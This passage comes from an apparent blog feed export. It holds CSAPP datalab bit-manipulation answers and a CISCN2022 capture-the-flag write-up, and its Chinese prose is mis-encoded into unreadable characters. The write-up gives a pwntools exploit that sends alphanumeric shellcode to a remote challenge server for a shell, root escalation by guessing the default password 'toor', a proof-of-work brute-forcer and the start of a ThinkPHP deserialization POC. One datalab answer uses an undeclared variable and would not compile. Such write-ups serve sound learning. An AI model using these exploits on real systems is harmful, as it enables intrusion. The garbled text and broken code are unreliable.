class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,b16,b8,b4,b2,b1,x,sign);</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+sign+x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç»è¿‡å¤šæ–¹è°ƒè¯•è¿˜æ˜¯è¾“ç»™äº† <code>-1</code> è¿™ä¸ªæµ‹è¯•ç‚¹ã€‚åæ¥æƒ³åˆ°å¦‚æœè´Ÿæ•°åˆ™å–åå³å¯ï¼Œç„¶åç¬¦å·ä½å°±é»˜è®¤ç»™å®ƒåŠ ç€ä¸Šå»å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-7"><a href="#ç­”æ¡ˆ-7" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+X+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´æ•°é˜¶æ®µåˆ°æ­¤å®Œç»“äº†å°±ã€‚</p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ä¹˜ <code>2</code>ã€‚é¦–å…ˆæ’é™¤æ‰é‚£äº›ç‰¹æ®Šå€¼ï¼š <code>NANï¼ŒINF</code> å’Œ <code>0</code>ï¼Œä¹˜äºŒè¿”å›æŒ‡æ•° <code>+1</code> å³å¯ï¼Œ</p><h4 id="ç­”æ¡ˆ-8"><a href="#ç­”æ¡ˆ-8" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°ä¸€ä¸ªç±»ä¼¼æ˜¯å¼ºåˆ¶è½¬æ¢çš„ä¸œè¥¿å§ï¼Œé¦–å…ˆè¿˜æ˜¯æŒ‰ç…§æµ®ç‚¹æ•°çš„è§„åˆ™æŠŠå„ä¸ªå­—æ®µæå–å‡ºæ¥ï¼Œç„¶åç‰¹åˆ¤ç§»ä½å°±è¡Œäº†ã€‚</p><h4 id="ç­”æ¡ˆ-9"><a href="#ç­”æ¡ˆ-9" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s=uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span>=((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line"><span class="keyword">int</span> frac=(uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line"><span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)<span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line"><span class="keyword">else</span> frac&gt;&gt;=(<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°è¿ç®— <code>pow(2,x)</code>ï¼Œè¿”å›ç»“æœä¸º <code>int</code> è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥ <code>1&lt;&lt;x</code>ï¼Œä½†æ˜¯å®ƒè¦æ±‚æµ®ç‚¹è®¡ç®—ã€‚</p><p>é¦–å…ˆé˜²æ­¢æº¢å‡ºå…ˆåˆ¤æ–­ï¼Œå› ä¸ºæ˜¯ <code>2</code> çš„æ•´æ•°æ¬¡æ–¹ï¼Œæ‰€ä»¥å®ƒçš„ç»“æœå°±æ˜¯ <code>(exp+127)&lt;&lt;23</code>ï¼Œç„¶ååˆ¤æ–­æ— ç©·å°å’Œæº¢å‡ºå³å¯ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•ã€‚</p><h4 id="ç­”æ¡ˆ-10"><a href="#ç­”æ¡ˆ-10" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼Œç”±äºæœ€åä¸€ä¸ªé¢˜ç›®æµ‹è¯•æ•°æ®æ¯”è¾ƒå¤šï¼Œå› æ­¤è¦ä¿®æ”¹æ—¶é™æ‰èƒ½é€šè¿‡ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘ç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œè¿™ <code>O(1)</code> çš„å¤æ‚åº¦ä¹Ÿä¸çŸ¥é“ä¸Šå“ªä¼˜åŒ–å»ã€‚</p><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><p><img src="/2022/06/03/CSAPP_Datalab/6.png" alt="6"></p><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº† <code>CSAPP</code> æ°¸è¿œçš„ç¥ï¼Œå…¥é—¨äºŒè¿›åˆ¶å¿…å¤‡ä¹¦ç±ï¼ŒäºŒåˆ·éƒ½èƒ½æ„Ÿè§‰å­¦åˆ°äº†å¾ˆå¤šä»¥å‰æ²¡å­¦åˆ°çš„ä¸œè¥¿ï¼Œæ¥ä¸‹æ¥æ²¡ä»¥å‰è®¤çœŸçœ‹çš„ä¹Ÿéƒ½å¾—å»çœ‹ä¸€éäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> ä¿¡æ¯çš„è¡¨ç¤ºå¤„ç† </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2022 åˆèµ›WP</title>
      <link href="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/"/>
      <url>/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/</url>
      
        <content type="html"><![CDATA[<p>å’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œæ¥å‘ä¸€ä¸‹</p><span id="more"></span><h1 id="CISCN2022åˆèµ›WP"><a href="#CISCN2022åˆèµ›WP" class="headerlink" title="CISCN2022åˆèµ›WP"></a>CISCN2022åˆèµ›WP</h1><h2 id="ä¸€ã€-æˆ˜é˜Ÿä¿¡æ¯"><a href="#ä¸€ã€-æˆ˜é˜Ÿä¿¡æ¯" class="headerlink" title="ä¸€ã€ æˆ˜é˜Ÿä¿¡æ¯"></a>ä¸€ã€ æˆ˜é˜Ÿä¿¡æ¯</h2><p><strong>æˆ˜é˜Ÿåç§°ï¼šflagè™½ä¸èƒ½è‡³ï¼Œç„¶å¿ƒå‘å¾€ä¹‹</strong></p><p><strong>æˆ˜é˜Ÿæ’åï¼šç¬¬130å</strong></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204836288.png" alt="image-20220529204836288"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204847304.png" alt="image-20220529204847304"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204852556.png" alt="image-20220529204852556"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°ç”µå°"><a href="#ç­¾åˆ°ç”µå°" class="headerlink" title="ç­¾åˆ°ç”µå°"></a>ç­¾åˆ°ç”µå°</h3><p>æ ¹æ®é¢˜ç›®çš„æç¤ºä»å…¬ä¼—å·è·å–ä¸¤ä¸ªhintï¼š</p><ol><li><p>åœ¨â€œæ ‡å‡†ç”µç è¡¨â€æ‰¾â€œå¼¼æ—¶å®‰å…¨åˆ°è¾¾äº†â€æ‰€å¯¹åº”çš„7ä¸ªç”µç ï¼Œå†è·Ÿâ€œå¯†ç æœ¬â€çš„å‰7*4ä¸ªæ•°å­—åˆ†åˆ«é€ä½è¿›è¡Œâ€œæ¨¡åç®—æ³•â€ï¼ˆåŠ ä¸è¿›ä½ã€å‡ä¸å€Ÿä½ï¼‰ï¼Œæ‰€å¾—åˆ°çš„å°±æ˜¯è¦å‘é€çš„ç”µç ã€‚å‘é€ç”µç å‰å…ˆå‘é€â€œsâ€å¯åŠ¨ï¼Œå³æŒ‰3ä¸ªâ€œ.â€ï¼Œè¿™ä¸ªå‘é€ç”µæŠ¥çš„è¿‡ç¨‹å¯ä»¥ä½¿ç”¨æŠ“åŒ…è½¯ä»¶è¿›è¡ŒæŠ“å–ï¼Œå¯æ–¹ä¾¿è¾“å…¥ç”µæŠ¥ã€‚</p></li><li><p>â€œå¼¼æ—¶å®‰å…¨åˆ°è¾¾äº†â€æ‰€å¯¹åº”çš„7ä¸ªç”µç ï¼š1732 2514 1344 0356 0451 6671 0055ã€‚æ¨¡åç®—æ³•ç¤ºä¾‹ï¼š1732ä¸6378å¾—åˆ°7000ï¼Œå‘åŒ…ç¤ºä¾‹ï¼š/send?msg=s</p></li></ol><p>ç„¶åè®¿é—®/secretçœ‹åˆ°å¯†ç ï¼Œå–å‰28ä¸ªåšæ¨¡10è¿ç®—ï¼Œå†ç”¨hint2çš„å‘åŒ…æ–¹å¼å‘é€å¾—åˆ°flagã€‚</p><h3 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯</h3><p>è¿™é¢˜ç»™äº† <code>ssh</code>ï¼Œæœ‰æƒé™å°±æƒ³ç€å…ˆè¿ä¸€ä¸‹ï¼Œè¿ä¸Šå»ä¹‹åè¯•è¯• <code>find / | grep &quot;flag.txt&quot; </code>æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼ <code>flag</code>çš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¸æ˜¯ <code>flag</code>ï¼Œæ­¤æ—¶åˆçœ‹åˆ°ä¸¤ä¸ªé¢˜ç›®æ˜¯è¿ç€çš„ï¼Œæ‰€ä»¥å°±çŒœæµ‹åº”è¯¥æ˜¯ <code>flag1.txt</code> å’Œ <code>flag2.txt</code>ã€‚å¯»æ‰¾ä¹‹åå‘ç° <code>/root/cube-shell/instance/flag_server/</code> ç›®å½•ä¸‹å­˜åœ¨ï¼Œç„¶åå°±ç›´æ¥æ‹¿åˆ°ä¸¤ä¸ªé¢˜ç›®çš„ <code>flag</code> äº†ã€‚</p><h3 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3</h3><p>æœ‰äº†å‰ä¸¤é“é¢˜ç›®çš„é“ºå«ä¹‹åï¼Œåˆè¯•äº†è¯•æŸ¥çœ‹è¯¥ç›®å½•ä¸‹çš„ <code>flag</code> å‘ç°æƒé™ä¸å¤Ÿï¼Œç„¶åå°±å°è¯•ææƒï¼Œç›´æ¥è¯•è¯•çœ‹é»˜è®¤å¯†ç ï¼Œéšä¾¿è¾“äº†å‡ ä¸ªè¯•åˆ°äº† <code>toor</code> ç›´æ¥å°±ææƒäº†ï¼Œç„¶åæ‹¿ä¸‹flagã€‚</p><h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>é“¾æ¥é¶æœºï¼Œæœ‰powï¼Œçˆ†ç ´å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">hash</span>=<span class="string">&#x27;ed8e248b4ec6828ea8f2cda56293484cbff40d934aba1e641cc3fcbf94e1757c&#x27;</span></span><br><span class="line">sss=<span class="string">&#x27;Eee9sVQumMWXoLEL&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> ch4 <span class="keyword">in</span> table:</span><br><span class="line">                hashvalue=sha256((ch1+ch2+ch3+ch4+sss).encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> hashvalue==<span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ch1+ch2+ch3+ch4)</span><br><span class="line">                    quit()</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥32ä¸ª0è¿‡ç¬¬äºŒæ­¥</p><p>è¿”å›ä¸€é•¿ä¸²å­—ç¬¦ä¸²</p><p>4993ad5ec5dfd5147003438c0e6afd696b026f48fb9676d625dbb6e2b1536b803c4d2e0a001b998f0d6afcb063e71fd8</p><p><img src="file:///C:/Users/XIA0JI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img">æ ¹æ®æç¤ºåˆ†æˆra,rb,k</p><p>ra=4993ad5ec5dfd5147003438c0e6afd69</p><p>rb=6b026f48fb9676d625dbb6e2b1536b80</p><p>K=3c4d2e0a001b998f0d6afcb063e71fd8</p><p>ç„¶åç»„åˆä¸€ä¸‹rb+raä¸º</p><p>6b026f48fb9676d625dbb6e2b1536b804993ad5ec5dfd5147003438c0e6afd69</p><p>æ‰“å…¥å‡ºflag</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>æ¼æ´ç‚¹åœ¨é€‰é¡¹2ï¼Œé€‰é¡¹2ç”¨ <code>mmap</code> å¼€è¾Ÿäº†ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œå¹¶å¯ä»¥å¾€ä¸Šé¢å†™ä¸œè¥¿ï¼Œå¹¶ä¸”æ‰§è¡Œè¿‡å»ï¼Œé‚£ä¹ˆå°±ç¡®å®šè¦åœ¨ä¸Šé¢å†™ <code>shellcode</code>ï¼Œä½†æ˜¯ä¹‹å‰æœ‰ä¸‰ä¸ªcheckï¼Œåä¸¤ä¸ªç»è¿‡äº¤å‰å¼•ç”¨å¯çŸ¥åœ¨é€‰é¡¹ <code>1</code> ä¸­ç»™ <code>ro0t</code> å¯ä»¥å°†å®ƒç½®ä¸º1ï¼Œäºæ˜¯æˆ‘ä»¬å°±å…ˆç”¨é€‰é¡¹ <code>1</code> ç½®ä¸º1ï¼Œå†ç”¨é€‰é¡¹ <code>2</code> å»å†™ <code>shellcode</code>ï¼Œä½†æ˜¯æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ <code>isprint</code> çš„ <code>check</code>ï¼Œé‚£å¥½åŠï¼Œå°±ç›´æ¥å†™ <code>alphanumeric shellcode</code>ã€‚</p><p>åœ¨ä¸‹é¢è¿™ä¸ªæ–‡ç« ä¸­æ‰¾åˆ°ç”¨çš„shellcode </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Y_peak/article/details/115307573</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.201.123.35&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">code = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;opt:2\r\nmsg:&#x27;</span>+code+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>TPçš„æ–°é“¾å­ï¼Œå…·ä½“æ¼æ´åˆ†æåœ¨è¿™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/321546.html</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å¯è§åœ¨/index.php/Index/test POSTä¼ åºåˆ—åŒ–å­—ç¬¦ä¸²ç»™aå³å¯</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1.png" alt="1"></p><p>POCåœ¨æ­¤ï¼Œlsä¸€ä¸‹å†è¯»ä¸‹flagå³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span 